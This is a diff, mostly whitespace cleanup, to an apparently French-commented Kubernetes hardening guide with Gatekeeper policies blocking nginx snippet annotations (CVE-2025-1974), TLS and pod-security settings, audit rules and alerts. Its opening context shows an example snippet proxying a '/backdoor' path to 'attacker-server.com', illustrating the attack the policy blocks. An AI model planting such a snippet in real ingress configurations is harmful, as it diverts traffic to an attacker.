@@ -27,7 +27,7 @@ metadata:
       location /backdoor {
         proxy_pass http://attacker-server.com;
       }
-    
+
     nginx.ingress.kubernetes.io/server-snippet: |
       location ~ /\.git {
         deny all;
@@ -353,21 +353,21 @@ spec:
     - target: admission.k8s.gatekeeper.sh
       rego: |
         package k8sdenynginxsnippets
-        
+
         violation[{"msg": msg}] {
           input.review.kind.kind == "Ingress"
           annotations := input.review.object.metadata.annotations
-          
+
           # Vérifier les annotations dangereuses
           snippet_keys := [
             "nginx.ingress.kubernetes.io/configuration-snippet",
             "nginx.ingress.kubernetes.io/server-snippet"
           ]
-          
+
           some key
           snippet_keys[_] = key
           annotations[key]
-          
+
           msg := sprintf("SÉCURITÉ: Annotation '%v' interdite (CVE-2025-1974)", [key])
         }
 
@@ -399,16 +399,16 @@ spec:
     - target: admission.k8s.gatekeeper.sh
       rego: |
         package k8srequiretls
-        
+
         violation[{"msg": msg}] {
           input.review.kind.kind == "HTTPRoute"
           route := input.review.object
-          
+
           # Vérifier que parentRef pointe vers listener HTTPS
           some i
           parent := route.spec.parentRefs[i]
           not parent.sectionName == "https"
-          
+
           msg := "HTTPRoute doit utiliser un listener HTTPS"
         }
 
@@ -458,7 +458,7 @@ spec:
         fsGroup: 1000
         seccompProfile:
           type: RuntimeDefault
-      
+
       containers:
         - name: app
           image: app:latest
@@ -468,11 +468,11 @@ spec:
               drop:
                 - ALL
             readOnlyRootFilesystem: true
-          
+
           volumeMounts:
             - name: tmp
               mountPath: /tmp
-      
+
       volumes:
         - name: tmp
           emptyDir: {}
@@ -493,7 +493,7 @@ rules:
     resources:
       - group: "gateway.networking.k8s.io"
         resources: ["gateways", "httproutes"]
-  
+
   # Log les accès aux Secrets
   - level: Metadata
     verbs: ["get", "list"]
@@ -520,7 +520,7 @@ groups:
           severity: critical
         annotations:
           summary: "Taux d'erreur 5xx > 5%"
-      
+
       # Alerte: Tentative d'accès non autorisé
       - alert: UnauthorizedAccess
         expr: |
@@ -530,7 +530,7 @@ groups:
           severity: warning
         annotations:
           summary: "Tentatives d'accès 403 anormales"
-      
+
       # Alerte: Certificat TLS expire bientôt
       - alert: TLSCertificateExpiring
         expr: |
